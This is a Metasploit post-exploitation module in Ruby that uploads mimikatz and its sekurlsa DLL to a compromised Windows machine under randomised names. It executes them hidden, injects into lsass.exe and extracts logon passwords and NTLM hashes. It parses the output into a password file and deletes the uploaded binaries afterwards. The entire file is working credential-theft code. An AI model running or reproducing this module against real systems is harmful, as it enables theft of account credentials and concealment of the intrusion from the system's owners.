require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File

        def initialize(info={})
                super( update_info( info,
                        'Name'          => 'Mimikatz',
                        'Description'   => %q{
				This module will upload the mimikatz executables to the target and retrieve passwords stored in lsass.exe.
                        },
                        'License'       => MSF_LICENSE,
                        'Author'        => [ 'Matt Andreko "hostess"' ],
                        'Version'       => '$Revision: 14976 $',
                        'Platform'      => [ 'windows' ],
                        'SessionTypes'  => [ 'meterpreter' ],
                        'References'    => [
                                [ 'URL', 'http://blog.gentilkiwi.com/mimikatz' ]
                        ],
                        'DisclosureDate'=> "Dec 31, 2010"
                ))

                register_options([
#                        OptAddress.new("LHOST",   [ false, "Listener IP address for the new session" ]),
#                        OptPort.new("LPORT",      [ false, "Listener port for the new session", 4444 ]),
                ])

        end

	def run
		print_status("Running module against #{sysinfo['Computer']}")
		host = Rex::FileUtils.clean_path(sysinfo["Computer"])
                pass_file = store_loot("windows.passwords", "text/plain", session, "", "#{host}_passwords.txt", "Windows Passwords")
		print_status(pass_file)
                mimikatz_dump(datastore['GETSYSTEM'], pass_file)
	end

	def mimikatz_dump(bypassuac, password_file)

		#
		# Upload mimikatz.exe and sekurlsa.dll
		#

		# randomize the filenames
                exe_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
		dll_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".dll"
		tmpdir = session.fs.file.expand_path("%TEMP%")

		# path to the mimikatz binaries
                path = ::File.join(Msf::Config.install_root, "data", "post")

		# decide, x86 or x64
                mexe = nil
		mdll = nil
                if sysinfo["Architecture"] =~ /wow64/i
                        mexe = ::File.join(path, "mimikatz-x64.exe")
			mdll = ::File.join(path, "sekurlsa-x64.dll")
                else
                        mexe = ::File.join(path, "mimikatz-x86.exe")
			mdll = ::File.join(path, "sekurlsa-x86.dll")
                end

		begin
			session.fs.file.upload_file("#{tmpdir}\\#{exe_filename}", mexe)
			session.fs.file.upload_file("#{tmpdir}\\#{dll_filename}", mdll)

			print_status("Mimikatz executables being uploaded..")
		rescue ::Exception => e
                        print_error("Error uploading files: #{e.class} #{e}")
                        return
                end

		#
		# Execute mimikatz
		#

		print_status("Executing #{tmpdir}\\#{exe_filename}")
		r = session.sys.process.execute("cmd /c \"#{tmpdir}\\#{exe_filename}\"", nil, {'Hidden' => true, 'Channelized' => true})

		r.channel.read
		r.channel.write("privilege::debug\n")
		
		r.channel.read
		r.channel.write("inject::process lsass.exe \"#{tmpdir}\\#{dll_filename}\"\n")
		
		r.channel.read
                r.channel.write("@getLogonPasswords\n")

		tmpusers = r.channel.read
		tmpusers += r.channel.read

		users = parse_passdump(tmpusers)
		output_file(users, password_file)

		r.channel.write("exit\n")
			
		# delete the uac bypass payload
                delete_exe = "cmd.exe /c del \"#{tmpdir}\\#{exe_filename}\""
		delete_dll = "cmd.exe /c del \"#{tmpdir}\\#{dll_filename}\""	
                session.sys.process.execute(delete_exe, nil, {'Hidden' => true})
		session.sys.process.execute(delete_dll, nil, {'Hidden' => true})
	end

	def parse_passdump(pass_dump)

		users = []

		pass_dump.lines.each do |f|

			current = {:username => "", :domain => "", :lmhash => "", :ntlmhash => "", :wdigest => "", :tspkg => ""}

			f.each_line do |line|
				if line.match(/^Utilisateur principal/)
					current[:username] = line[30..-2]
				elsif line.match(/^Domaine d'authentification/)
					current[:domain] = line[30..-2]
				elsif line.match(/msv1_0/)
					tmp = line[24..-2]
					if tmp == "n.t. (LUID KO)"
						current[:lmhash] = ""
						current[:ntlmhash] = ""
					else
						current[:lmhash] = line[28, 32]
						current[:ntlmhash] = line[70, 32]
					end
				elsif line.match(/wdigest/)
					tmp = line[24..-2]
					if tmp == "n.t. (LUID KO)"
						current[:wdigest] = ""
					else
						if tmp.nil?
							current[:wdigest] = ""
						else
							current[:wdigest] = tmp
						end
					end
				elsif line.match(/tspkg/)
					tmp = line[24..-2]
					if tmp == "n.t. (LUID KO)"
						current[:tspkg] = ""
					else
						current[:tspkg] = tmp
					end

					users.push(current)
					current = {:username => "", :domain => "", :lmhash => "", :ntlmhash => "", :wdigest => "", :tspkg => ""}
				end
			end
		end	
		
		return users
	end

	def output_file(users, password_file)

		output = "username, domain, lmhash, ntlmhash, wdigest, tspkg\n"
		users.each do |u|
			output += "#{u[:username]}, #{u[:domain]}, #{u[:lmhash]}, #{u[:ntlmhash]}, #{u[:wdigest]}, #{u[:tspkg]}\n" 
		end

		file_local_write(password_file, output)	

	end

end
